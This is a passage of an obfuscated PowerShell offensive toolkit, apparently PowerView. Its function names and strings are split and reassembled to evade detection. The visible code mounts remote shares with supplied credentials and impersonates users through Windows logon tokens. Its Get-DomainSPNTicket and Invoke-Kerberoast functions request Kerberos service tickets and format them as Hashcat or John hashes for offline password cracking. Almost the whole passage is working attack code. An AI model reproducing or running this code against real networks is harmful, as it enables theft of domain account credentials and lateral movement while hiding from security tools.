                ${CON`T`EXT} = &("{0}{2}{1}"-f 'Ne','bject','w-O') -TypeName ("{1}{11}{7}{4}{5}{10}{2}{3}{8}{0}{6}{9}" -f't','System.DirectoryServ','g','em','ccountM','a','.Princ','ces.A','en','ipalContext','na','i') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"D`OM`AIn", ${CON`NeC`TTARGet}, ${cr`E`dEN`TIal}."US`ER`NAME", ${Cr`EdE`NtIal}.("{1}{6}{0}{2}{3}{5}{4}"-f'Net','G','w','orkCredenti','l','a','et').Invoke()."Pa`SsWo`Rd")
            }
            else {
                ${C`ONT`ExT} = &("{3}{2}{0}{1}"-f 'jec','t','ew-Ob','N') -TypeName ("{3}{1}{5}{4}{6}{12}{11}{10}{0}{9}{8}{2}{7}"-f 'untMa','ystem.','inci','S','ctor','Dire','yService','palContext','t.Pr','nagemen','co','Ac','s.') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"Do`main", ${Co`N`NECttAr`get})
            }
        }
        else {
            if (${psB`Oun`d`PARAmetErS}[("{0}{1}{2}{3}"-f'Crede','nt','i','al')]) {
                &("{2}{1}{3}{0}"-f 'ose','e','Writ','-Verb') ("{12}{0}{11}{4}{7}{6}{2}{5}{1}{3}{8}{10}{9}" -f 'Get-P','rnate','ng alt',' ','ext] U','e','i','s','crede','ials','nt','rincipalCont','[')
                ${Do`mA`inN`Ame} = &("{3}{2}{1}{0}" -f'in','ma','-Do','Get') | &("{0}{2}{1}{3}" -f'S','lect-O','e','bject') -ExpandProperty ("{1}{0}"-f'ame','N')
                ${c`onte`xt} = &("{2}{0}{1}"-f'w-','Object','Ne') -TypeName ("{1}{9}{12}{6}{8}{13}{0}{2}{5}{11}{3}{4}{7}{14}{10}"-f'nage','Syste','ment.Pr','C','o','inc','e','nt','rvices.Ac','m.','t','ipal','DirectoryS','countMa','ex') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"D`omAIN", ${d`OM`AiNn`AmE}, ${CreDE`NtI`AL}."u`SER`NaMe", ${C`RED`eNtiAL}.("{3}{5}{4}{2}{1}{0}{6}" -f't','den','e','GetNe','Cr','twork','ial').Invoke()."PAs`SWoRd")
            }
            else {
                ${C`oNt`eXt} = &("{1}{3}{0}{2}" -f '-O','Ne','bject','w') -TypeName ("{15}{6}{14}{13}{3}{4}{7}{0}{2}{1}{10}{9}{12}{5}{11}{8}"-f'v','.AccountMan','ices','irec','toryS','cip','em','er','ext','.','agement','alCont','Prin','D','.','Syst') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"D`omaIN")
            }
            ${o`BjEC`Tid`entITy} = ${IdEn`TITY}
        }

        ${o`UT} = &("{1}{0}{2}"-f 'j','New-Ob','ect') ("{1}{2}{0}" -f 't','PSOb','jec')
        ${o`UT} | &("{0}{1}{2}"-f'Add-M','embe','r') ("{0}{3}{1}{2}" -f'N','eprope','rty','ot') ("{0}{1}" -f 'Cont','ext') ${co`NTexT}
        ${O`Ut} | &("{2}{0}{1}"-f'emb','er','Add-M') ("{1}{2}{0}" -f'y','Not','epropert') ("{2}{0}{1}" -f'ent','ity','Id') ${ObJeC`T`IDEnt`ItY}
        ${o`UT}
    }
    catch {
        &("{3}{2}{1}{4}{0}" -f 'g','War','te-','Wri','nin') ('[G'+'e'+'t-Pr'+'i'+'nci'+'pa'+'lConte'+'xt] '+'Er'+'ror '+'cr'+'eating'+' '+'bindi'+'ng '+'for'+' '+'ob'+'ject '+"('$Identity') "+'c'+'ontex'+'t '+': '+"$_")
    }
}


function AD`D-R`EmO`Te`conneCtI`oN {


    [CmdletBinding(dEfaUlTpARAMeTERsETname = {"{2}{0}{1}{3}" -f 'om','p','C','uterName'})]
    Param(
        [Parameter(poSItION = 0, mAnDatORy = ${T`RUE}, pARaMEteRSEtname = "coMP`UtE`Rn`Ame", VALuefROmpIPeline = ${tR`UE}, vALuEFroMpIPELINeBypROpErtynaMe = ${tr`Ue})]
        [Alias({"{0}{1}{2}"-f 'H','os','tName'}, {"{1}{2}{3}{0}" -f 'ame','dns','ho','stn'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mPUter`NaME},

        [Parameter(PoSiTiON = 0, PArAmeTErSeTNaMe = "pa`Th", manDATOry = ${tR`UE})]
        [ValidatePattern({(("{1}{2}{0}{3}" -f 'oR.','QoRQoRQoRQoR.','*QoRQ','*'))."r`ep`Lace"(([char]81+[char]111+[char]82),'\')})]
        [String[]]
        ${P`ATh},

        [Parameter(MaNdAToRy = ${T`Rue})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEd`en`TiAL}
    )

    BEGIN {
        ${nEtRESoU`RCe`InSt`A`Nce} =  $KH3d6::("{3}{1}{2}{0}"-f 'ce','e','ateInstan','Cr').Invoke(${nE`TreSoU`R`c`ew})
        ${NeTReSo`Urc`eI`NSTANCE}."D`wt`YPe" = 1
    }

    PROCESS {
        ${PAt`HS} = @()
        if (${Ps`BOun`dPA`RAMeTE`Rs}[("{1}{0}{2}{3}" -f'p','Com','ute','rName')]) {
            ForEach (${T`A`RG`ETComputeRn`A`mE} in ${Com`P`UTErNa`Me}) {
                ${T`ArGEtC`oMpU`TE`RnAme} = ${Tar`get`cO`mPu`TErN`Ame}.("{1}{0}"-f'im','Tr').Invoke('\')
                ${pA`THs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${paT`HS} += ,${pA`TH}
        }

        ForEach (${T`ArgE`TpA`TH} in ${PA`T`hs}) {
            ${NeTre`SOUrcEinS`T`Ance}."lprEMo`Tena`mE" = ${T`A`Rg`eTpath}
            &("{0}{2}{1}{3}{4}"-f'Wri','-','te','Ver','bose') ('[Add-RemoteConnec'+'t'+'i'+'on]'+' '+'Attem'+'pti'+'ng '+'t'+'o '+'mou'+'nt:'+' '+"$TargetPath")

            
            
            ${rE`sUlT} = ${m`PR}::("{3}{4}{2}{0}{1}"-f 'nnection2','W','o','WN','etAddC').Invoke(${n`ETRE`sOu`RceInSt`ANCE}, ${cReD`eN`TiAl}.("{3}{0}{1}{2}" -f'work','Credent','ial','GetNet').Invoke()."pAS`s`woRd", ${c`RE`DentIaL}."uS`erNaME", 4)

            if (${RES`UlT} -eq 0) {
                &("{3}{2}{0}{1}" -f 'e','rbose','rite-V','W') ("$TargetPath "+'succe'+'s'+'sful'+'ly '+'mount'+'ed')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function RemoVe`-`REm`O`TeconN`ECtIOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{9}{6}{5}{12}{11}{1}{7}{8}{3}{4}{10}{0}" -f's','e','P','un','c','l','ou','Changi','ngF','SUseSh','tion','at','dProcessForSt'}, '')]
    [CmdletBinding(DefAulTpArAMeTERsEtnAMe = {"{2}{1}{0}"-f 'rName','ompute','C'})]
    Param(
        [Parameter(PosItIon = 0, MandaToRY = ${t`RUe}, pAraMETersETname = "C`omP`UTern`Ame", ValUEFROMPIPelInE = ${Tr`Ue}, ValuEFRomPiPeLInEBYpROPERTYNAMe = ${TR`UE})]
        [Alias({"{1}{0}{2}"-f'stN','Ho','ame'}, {"{1}{2}{0}" -f 'hostname','dn','s'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COM`putE`RNaMe},

        [Parameter(POsitioN = 0, PAraMETErsETNaME = "p`Ath", MANDaTOrY = ${TR`UE})]
        [ValidatePattern({(("{0}{1}{4}{2}{3}" -f 'dXLdX','LdXLdX','dX','LdXL.*','L.*')) -crePLace 'dXL',[chAR]92})]
        [String[]]
        ${p`ATh}
    )

    PROCESS {
        ${pa`T`hs} = @()
        if (${P`sbOuNd`pARa`mETErS}[("{0}{2}{1}" -f 'C','puterName','om')]) {
            ForEach (${T`ArGEtCo`mPUTeR`Na`mE} in ${C`OM`PuTe`RNAMe}) {
                ${T`ArgEtC`oMpuT`e`RNa`mE} = ${TA`R`ge`T`ComPu`TerName}.("{1}{0}" -f 'm','Tri').Invoke('\')
                ${pa`T`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${pAT`HS} += ,${pA`Th}
        }

        ForEach (${TA`RGET`paTh} in ${p`ATHS}) {
            &("{4}{3}{2}{1}{0}" -f 'se','rbo','e','V','Write-') ('['+'Remove-'+'Remote'+'Conn'+'ecti'+'on] '+'A'+'t'+'te'+'mpting '+'to'+' '+'un'+'moun'+'t: '+"$TargetPath")
            ${rE`S`ULT} = ${m`pR}::("{0}{1}{2}{4}{3}{5}"-f'W','NetC','an','Connect','cel','ion2').Invoke(${ta`RgE`T`patH}, 0, ${T`Rue})

            if (${R`ES`Ult} -eq 0) {
                &("{2}{1}{0}"-f 'rbose','e-Ve','Writ') ("$TargetPath "+'s'+'ucce'+'ssf'+'ully'+' '+'umm'+'oun'+'ted')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function inV`oke-`USeRIMpeRSO`Na`TioN {


    [OutputType([IntPtr])]
    [CmdletBinding(dEfauLTpARAMEteRSetnAMe = {"{0}{2}{1}" -f 'Credenti','l','a'})]
    Param(
        [Parameter(MaNDatoRy = ${Tr`UE}, pAraMetERsETNaMe = "crEd`EntI`AL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`d`enTIAL},

        [Parameter(ManDatOry = ${t`RuE}, paRamEtErSEtNamE = "T`oKEnhA`NdlE")]
        [ValidateNotNull()]
        [IntPtr]
        ${ToKEn`HA`NDlE},

        [Switch]
        ${qu`i`ET}
    )

    if ((  $4WXP::"cUrReNTth`R`EaD".("{0}{1}{3}{2}"-f'Get','ApartmentSta','e','t').Invoke() -ne 'STA') -and (-not ${pSBouN`Dp`A`RameTers}[("{0}{1}"-f 'Q','uiet')])) {
        &("{2}{0}{1}"-f '-','Warning','Write') ("{13}{19}{9}{10}{21}{1}{2}{6}{4}{11}{15}{16}{7}{18}{3}{20}{0}{8}{17}{12}{5}{14}" -f 'ken im','s ','no',' state',' c','not work','t','readed apartme','p','rsh','ell.','ur','tion may ','[Invoke-','.','rently ','in a single-th','ersona','nt','UserImpersonation] powe',', to','exe i')
    }

    if (${PsboundPA`R`AM`eTErs}[("{2}{0}{1}" -f 'enH','andle','Tok')]) {
        ${LOgON`TokEn`hA`Nd`Le} = ${TO`KEN`HANDLE}
    }
    else {
        ${lO`gOn`ToKe`NHandle} =  $nFV::"z`ERO"
        ${N`eTWor`kCRede`NtIal} = ${crE`Den`T`IaL}.("{2}{5}{0}{4}{3}{1}"-f 'kCr','tial','GetN','den','e','etwor').Invoke()
        ${u`serDom`AIN} = ${nE`Tw`O`RKCREDe`NTIAl}."DomA`In"
        ${uSe`RN`AmE} = ${netWoRk`c`Re`D`E`NTIAl}."USER`Na`me"
        &("{1}{2}{0}"-f'ng','W','rite-Warni') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${R`E`SUlt} = ${a`Dv`ApI`32}::("{0}{1}{2}" -f'L','ogo','nUser').Invoke(${UsER`Na`Me}, ${usE`RdO`mAin}, ${NeTw`o`R`KcREdE`Ntial}."pA`ss`WOrd", 9, 3, [ref]${loGONTOke`NHA`N`DLe});${laST`E`R`ROR} =  (VariABLe  7dk).VAlUe::("{3}{0}{4}{2}{1}" -f 'et','Win32Error','ast','G','L').Invoke();

        if (-not ${r`ESu`lT}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${rEsU`LT} = ${A`DVaPI`32}::("{6}{1}{5}{2}{4}{0}{3}"-f'edO','m','sonateL','nUser','ogg','per','I').Invoke(${LOgOnT`o`KEnhAn`d`Le})

    if (-not ${REs`U`lt}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{2}{1}{0}{3}"-f 'te-Verb','ri','W','ose') ("{7}{0}{9}{14}{12}{2}{8}{10}{3}{11}{6}{16}{18}{1}{5}{17}{4}{15}{13}" -f'Inv','ssf','ers','e ','r','ully imp','ed','[','onation] Alte','oke-Use','rnat','cr','mp','nated','rI','so','enti','e','als succe')
    ${lOGo`N`TOk`ENhAndLE}
}


function Inv`O`kE-RE`VErtTOSeLF {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${to`KEnHA`N`dLE}
    )

    if (${PsBoUN`dp`A`RA`mETerS}[("{1}{2}{0}"-f'e','Tok','enHandl')]) {
        &("{3}{0}{1}{2}"-f '-Warn','in','g','Write') ("{19}{15}{8}{16}{21}{5}{3}{1}{12}{18}{6}{17}{0}{13}{2}{14}{22}{11}{4}{9}{7}{10}{20}"-f 'i','l','person','e','clo','ToS','g ','LogonUser() ','oke-','sing ','token ha',' ','f] Revert','m','ation an','v','R','token ','in','[In','ndle','evert','d')
        ${R`ESU`Lt} = ${KeRn`E`L32}::("{0}{2}{3}{1}"-f'C','e','loseHa','ndl').Invoke(${t`OkE`Nh`ANDLe})
    }

    ${R`EsULT} = ${aDv`A`PI`32}::("{3}{0}{2}{1}" -f 't','f','ToSel','Rever').Invoke();${lAst`ERR`OR} =  ( Dir  VARIable:7Dk).valuE::("{2}{0}{1}{3}"-f 'tL','astWin','Ge','32Error').Invoke();

    if (-not ${resu`lt}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{2}{1}{0}" -f 'ose','ite-Verb','Wr') ("{11}{8}{12}{2}{6}{4}{3}{9}{5}{10}{0}{13}{1}{7}"-f'ersonat','e','o','ok','elf] T','n ','S','verted','vok','e','imp','[In','e-RevertT','ion successfully r')
}


function g`et-dOm`A`iNSP`NtI`cKeT {


    [OutputType({"{6}{1}{0}{4}{3}{2}{5}" -f 'erV','w','ck','w.SPNTi','ie','et','Po'})]
    [CmdletBinding(dEFAuLTPARamEteRSETNAME = {"{0}{1}" -f'Raw','SPN'})]
    Param (
        [Parameter(pOsiTIoN = 0, paRAMeteRSEtNAME = "RaW`spn", MaNDATORY = ${T`Rue}, VaLUEfromPiPeLine = ${T`RUE})]
        [ValidatePattern({"{1}{0}"-f'*','.*/.'})]
        [Alias({"{0}{2}{3}{1}{4}" -f'Servi','ncipalN','c','ePri','ame'})]
        [String[]]
        ${S`pn},

        [Parameter(pOSiTion = 0, parAMEtersEtNAMe = "U`sER", MAnDaToRY = ${tr`UE}, VALuEFroMPIPelinE = ${t`Rue})]
        [ValidateScript({ ${_}."PS`obJeCT"."t`yPENameS"[0] -eq ("{1}{2}{3}{0}"-f'View.User','Po','we','r') })]
        [Object[]]
        ${us`Er},

        [ValidateSet({"{0}{1}"-f'J','ohn'}, {"{0}{1}"-f 'Hashca','t'})]
        [Alias({"{1}{0}"-f'mat','For'})]
        [String]
        ${outpUtF`O`RmAt} = ("{1}{0}" -f 'hcat','Has'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`D`eNTiAL} =   $21GV7E::"e`Mpty"
    )

    BEGIN {
        ${NU`LL} =   ( VaRIAbLe  2EOm).ValUe::("{3}{2}{0}{4}{5}{1}" -f'thP','alName','dWi','Loa','art','i').Invoke(("{5}{1}{0}{4}{3}{2}"-f 'tem.','ys','ityModel','t','Iden','S'))

        if (${PsbouN`DpAr`AM`ete`Rs}[("{1}{0}{2}" -f 'e','Cr','dential')]) {
            ${l`o`GoNtO`KeN} = &("{2}{1}{0}{3}{4}" -f'oke-Use','v','In','rImperson','ation') -Credential ${C`RE`Dent`IAl}
        }
    }

    PROCESS {
        if (${P`SBoU`NDPARaME`TErs}[("{0}{1}" -f 'Use','r')]) {
            ${t`AR`ge`TobJ`eCT} = ${U`SeR}
        }
        else {
            ${tARG`eTOBjE`CT} = ${S`pN}
        }

        ForEach (${obJ`ECt} in ${TaRgET`o`BJECT}) {
            if (${psB`o`Und`parAMetERS}[("{1}{0}" -f 'ser','U')]) {
                ${US`eRs`pn} = ${obJ`ECt}."SErvI`CePR`In`ci`pa`LnAme"
                ${SAm`ACcOU`Ntna`me} = ${O`B`jeCT}."SaMa`cco`Un`TNA`Me"
                ${dISTI`Ng`U`ISHEdNaMe} = ${O`BJEcT}."dist`i`NgU`iSheDnaMe"
            }
            else {
                ${USe`R`SPN} = ${oB`jE`ct}
                ${SAMaC`coU`NTn`AMe} = ("{1}{0}" -f'OWN','UNKN')
                ${DIsT`in`gUISHEDn`AmE} = ("{2}{1}{0}"-f 'KNOWN','N','U')
            }

            
            if (${uS`Er`SpN} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${U`SErs`pn} = ${U`SE`RSPN}[0]
            }

            try {
                ${t`i`CkeT} = &("{2}{1}{0}"-f't','w-Objec','Ne') ("{3}{15}{1}{2}{13}{7}{5}{0}{4}{14}{6}{10}{16}{8}{11}{12}{9}"-f'To','Ide','nti','Sys','ke','.','e','l','SecurityT','en','quest','o','k','tyMode','ns.KerberosR','tem.','or') -ArgumentList ${use`Rspn}
            }
            catch {
                &("{1}{2}{0}"-f'rning','Write','-Wa') ('[Get-Dom'+'ainSPNT'+'i'+'c'+'ke'+'t'+'] '+'Erro'+'r'+' '+'r'+'equesting'+' '+'ticke'+'t '+'fo'+'r '+'S'+'PN '+"'$UserSPN' "+'fr'+'om '+'us'+'er '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${TI`Ck`Et}) {
                ${t`ICKeT`B`yT`ESTReAm} = ${Ti`Ck`eT}.("{2}{1}{0}"-f'uest','etReq','G').Invoke()
            }
            if (${T`ICk`ETBYTE`S`T`REAM}) {
                ${o`Ut} = &("{1}{0}{2}" -f 'ew-Ob','N','ject') ("{0}{2}{1}" -f 'PS','ct','Obje')

                ${t`iCkeT`hexsTrEAM} =   $97uYF::("{0}{1}{2}" -f 'T','oStri','ng').Invoke(${TI`CKe`TbyT`EST`R`EaM}) -replace '-'

                ${O`UT} | &("{0}{1}{2}"-f'Ad','d-Me','mber') ("{1}{0}{2}" -f'ro','Notep','perty') ("{1}{4}{0}{3}{2}"-f 'unt','SamAc','me','Na','co') ${sAMa`cC`ou`Ntname}
                ${o`UT} | &("{2}{1}{0}" -f'ember','dd-M','A') ("{2}{1}{0}" -f 'erty','p','Notepro') ("{1}{2}{5}{3}{0}{4}"-f 'e','Di','st','uish','dName','ing') ${di`s`T`INGUis`hE`DNAME}
                ${o`Ut} | &("{2}{0}{1}" -f '-Memb','er','Add') ("{1}{0}{2}{3}" -f'roper','Notep','t','y') ("{3}{2}{0}{1}{4}" -f 'r','vi','e','S','cePrincipalName') ${tiC`KET}."s`ERv`Ic`Ep`RinCi`PALNa`Me"

                
                
                if(${TI`CkEt`HexSTr`e`Am} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${et`YpE} =  $I92::("{0}{1}"-f 'ToB','yte').Invoke( ${mat`c`HeS}."E`TYpEL`eN", 16 )
                    ${C`IP`Her`TEXtleN} =  (gcI  ('V'+'AriA'+'blE:i9'+'2')  ).VALUe::("{0}{1}{2}" -f'ToU','In','t32').Invoke(${mATcH`ES}."CiPh`ER`TExtlen", 16)-4
                    ${C`iphE`R`TExT} = ${Ma`Tch`Es}."DatatOe`Nd".("{2}{0}{1}" -f 'tri','ng','Subs').Invoke(0,${C`IpheR`T`EXTL`en}*2)

                    
                    if(${ma`TcH`es}."d`AT`AtoenD".("{0}{1}{2}" -f 'Subst','ri','ng').Invoke(${CIp`h`ERTE`xtLEN}*2, 4) -ne ("{1}{0}" -f'482','A')) {
                        &("{2}{0}{3}{1}" -f 'it','-Warning','Wr','e') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        ${H`Ash} = ${N`Ull}
                        ${O`Ut} | &("{0}{2}{1}"-f'Ad','er','d-Memb') ("{0}{2}{3}{1}" -f 'No','erty','tepro','p') ("{3}{1}{0}{2}"-f're','t','am','TicketByteHexS') ( (  ItEM VarIAble:2eMqh6).VALUe::("{0}{2}{1}"-f 'T','ng','oStri').Invoke(${TIcK`eTb`yTes`TRE`Am}).("{1}{0}{2}"-f 'ac','Repl','e').Invoke('-',''))
                    } else {
                        ${h`Ash} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${O`UT} | &("{0}{1}{2}"-f'Ad','d','-Member') ("{3}{2}{0}{1}"-f'per','ty','ro','Notep') ("{2}{3}{1}{0}"-f 'tream','teHexS','Ti','cketBy') ${NU`LL}
                    }
                } else {
                    &("{1}{0}{2}{3}" -f'r','W','i','te-Warning') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${hA`Sh} = ${nU`lL}
                    ${O`UT} | &("{2}{1}{0}"-f 'ber','-Mem','Add') ("{1}{0}{2}"-f'per','Notepro','ty') ("{2}{1}{0}{4}{3}" -f'etByt','ick','T','tream','eHexS') ( (  vaRiablE  2eMqH6).VALUE::("{2}{1}{0}"-f 'ing','tr','ToS').Invoke(${t`ICkETBYtESt`R`eam}).("{0}{2}{1}" -f'Re','ace','pl').Invoke('-',''))
                }

                if(${H`ASH}) {
                    
                    if (${Ou`T`pUt`FoRMaT} -match ("{0}{1}" -f 'Joh','n')) {
                        ${HashFO`RM`AT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${DI`sTi`NGU`iShe`dN`Ame} -ne ("{0}{1}" -f 'UNKN','OWN')) {
                            ${uSER`d`OMAiN} = ${disTi`NGu`is`HedN`A`mE}.("{1}{0}"-f'ubString','S').Invoke(${d`ISti`N`GUIShEdNaMe}.("{0}{1}"-f 'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${UsEr`Do`M`AiN} = ("{1}{2}{0}" -f'OWN','U','NKN')
                        }

                        
                        ${hA`SH`FOrM`AT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`Ut} | &("{0}{1}{2}" -f'Add-Me','mb','er') ("{1}{3}{0}{2}"-f 'pert','N','y','otepro') ("{1}{0}" -f'sh','Ha') ${hashF`oRm`AT}
                }

                ${o`Ut}."PSo`B`jEct"."typ`E`NAMeS".("{1}{0}" -f'ert','Ins').Invoke(0, ("{1}{2}{3}{4}{0}"-f't','Power','Vie','w.S','PNTicke'))
                ${o`Ut}
            }
        }
    }

    END {
        if (${L`O`GonT`OKen}) {
            &("{3}{4}{2}{1}{0}" -f 'tToSelf','er','v','Invoke-','Re') -TokenHandle ${log`onTo`kEN}
        }
    }
}


function i`NvOKe`-Ke`RBerO`AST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f'uldP','PSSho','ro','cess'}, '')]
    [OutputType({"{0}{3}{2}{1}{4}" -f'PowerView','ick','NT','.SP','et'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitiON = 0, vALuEFrOmPiPeliNe = ${T`RuE}, vALuEfRoMPiPElINEbYPrOPERTyNAME = ${T`Rue})]
        [Alias({"{3}{1}{2}{0}"-f'Name','ngui','shed','Disti'}, {"{0}{3}{4}{2}{1}"-f'S','Name','nt','amAcco','u'}, {"{1}{0}" -f'e','Nam'}, {"{1}{4}{5}{0}{3}{2}"-f'hedN','Memb','e','am','erDi','stinguis'}, {"{1}{0}{2}"-f'am','MemberN','e'})]
        [String[]]
        ${iDE`NT`ITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`maIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ter','Fil'})]
        [String]
        ${Lda`PfIl`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'A','DSPat','h'})]
        [String]
        ${S`EaRchb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{2}{1}{3}"-f'm','nContro','ai','ller','Do'})]
        [String]
        ${ser`V`er},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{0}{1}{2}" -f 'O','ne','Level'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${Sea`RCHS`cOPE} = ("{0}{2}{1}"-f'Su','ee','btr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`suL`TPaGEsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVeRtIMe`L`I`m`iT},

        [Switch]
        ${tO`Mbs`T`OnE},

        [ValidateSet({"{1}{0}"-f'ohn','J'}, {"{1}{0}{2}"-f 'h','Has','cat'})]
        [Alias({"{0}{1}{2}" -f'F','orm','at'})]
        [String]
        ${O`U`TPu`TFOrMaT} = ("{0}{2}{1}" -f'Has','t','hca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDe`Nti`Al} =  (  Get-vaRIABlE ("21G"+"v7e") -vALu )::"E`MPtY"
    )

    BEGIN {
        ${uSE`RSe`Arche`RaRGuM`ENts} = @{
            'SPN' = ${tr`UE}
            ("{1}{2}{0}"-f's','Pr','opertie') = ("{1}{10}{2}{9}{14}{8}{13}{12}{7}{4}{0}{11}{5}{6}{15}{3}"-f'e,servicep','samaccountn',',d','ame','hednam','ci','pal','is','ti','i','ame','rin','u','ng','s','n')
        }
        if (${psBOuNd`PaRAME`T`e`Rs}[("{1}{0}"-f'omain','D')]) { ${UseRseA`Rc`heRarGu`m`enTS}[("{0}{1}{2}" -f 'D','omai','n')] = ${DoM`A`iN} }
        if (${pS`BO`Un`DPaR`AMET`ERS}[("{0}{3}{1}{2}"-f'LDAPFi','e','r','lt')]) { ${useR`SE`A`Rche`RaRgu`me`Nts}[("{3}{2}{1}{0}"-f 'er','t','APFil','LD')] = ${L`DAP`FiL`Ter} }
        if (${pS`BO`UNd`pA`RameTe`Rs}[("{0}{2}{1}"-f'SearchBa','e','s')]) { ${UserSea`R`ch`eRA`R`gUmEN`Ts}[("{0}{2}{1}"-f'SearchB','se','a')] = ${sEAr`cHbA`sE} }
        if (${psBO`UNd`P`Ar`AMeTeRs}[("{1}{0}" -f'r','Serve')]) { ${USe`RsEa`RCHEraRG`UM`enTs}[("{0}{1}" -f'Serv','er')] = ${s`erVeR} }
        if (${p`sB`ou`NDpaRaM`eTERs}[("{2}{1}{0}" -f'cope','chS','Sear')]) { ${Us`E`RSEARcHeR`Arg`UMEN`Ts}[("{2}{1}{0}"-f'ope','archSc','Se')] = ${sEa`RChSC`o`pE} }
        if (${PS`Bo`UnDPa`RAM`ETERS}[("{0}{2}{3}{1}" -f 'Resu','Size','ltP','age')]) { ${USeRse`A`R`cHeR`ARgU`Ments}[("{0}{1}{3}{2}"-f'R','esultPag','ize','eS')] = ${rESUlTp`Ag`E`SIzE} }
        if (${PSBoun`dP`Ara`Me`TErs}[("{1}{2}{0}" -f 'mit','Se','rverTimeLi')]) { ${u`SERSearchERAR`G`UM`EN`Ts}[("{0}{1}{2}{4}{3}"-f 'S','erver','Tim','imit','eL')] = ${SERvERT`ImEL`iM`It} }
        if (${PS`BOUNdp`Ar`AmEteRs}[("{1}{2}{0}"-f'ne','Tomb','sto')]) { ${u`s`ERSE`A`RchE`Rar`guMeNTs}[("{1}{0}" -f 'tone','Tombs')] = ${to`mbst`onE} }
        if (${P`SbOUndpAr`AmE`TErS}[("{3}{1}{0}{2}" -f 'a','enti','l','Cred')]) { ${U`seRsearcH`ERa`R`GUMe`NTS}[("{2}{1}{0}{3}"-f 'en','red','C','tial')] = ${CREdEN`T`i`AL} }

        if (${Psb`OUNDpar`A`MeT`e`RS}[("{2}{0}{1}" -f 'entia','l','Cred')]) {
            ${LoGo`Nt`oKEN} = &("{0}{4}{2}{3}{5}{1}" -f'Invo','n','UserImpersona','ti','ke-','o') -Credential ${cRE`DENt`IaL}
        }
    }

    PROCESS {
        if (${p`SBo`U`NDpA`RamETERs}[("{0}{1}{2}" -f 'Ident','it','y')]) { ${uSe`R`s`eArCH`erarGUMen`Ts}[("{2}{0}{1}" -f 'ntit','y','Ide')] = ${ID`En`TitY} }
        &("{1}{2}{3}{0}{4}"-f 'ainUs','G','et-','Dom','er') @UserSearcherArguments | &("{2}{0}{1}"-f 'ere-O','bject','Wh') {${_}."SAMaccoUnT`Na`me" -ne ("{0}{1}" -f 'krb','tgt')} | &("{0}{2}{4}{5}{3}{1}"-f'Get-','ket','D','PNTic','omai','nS') -OutputFormat ${O`UTpU`TFoRMAt}
    }

    END {
        if (${l`oGO`NtO`kEn}) {
            &("{3}{2}{0}{5}{4}{1}" -f 'e','oSelf','vok','In','rtT','-Reve') -TokenHandle ${lOg`OnT`okEn}
        }
    }
}


function GEt`-PAthA`cl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f 's','hould','Proces','PSS'}, '')]
    [OutputType({"{1}{3}{4}{0}{2}"-f'eA','P','CL','owerView.','Fil'})]
    [CmdletBinding()]
    Param(
        [Parameter(MaNdaTORy = ${T`RUE}, VAlUEfROmpIpeLiNE = ${tR`UE}, vaLueFrOMpiPEliNEbyproPeRtynAMe = ${Tr`Ue})]
        [Alias({"{0}{1}{2}"-f'Ful','l','Name'})]
        [String[]]
        ${P`Ath},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
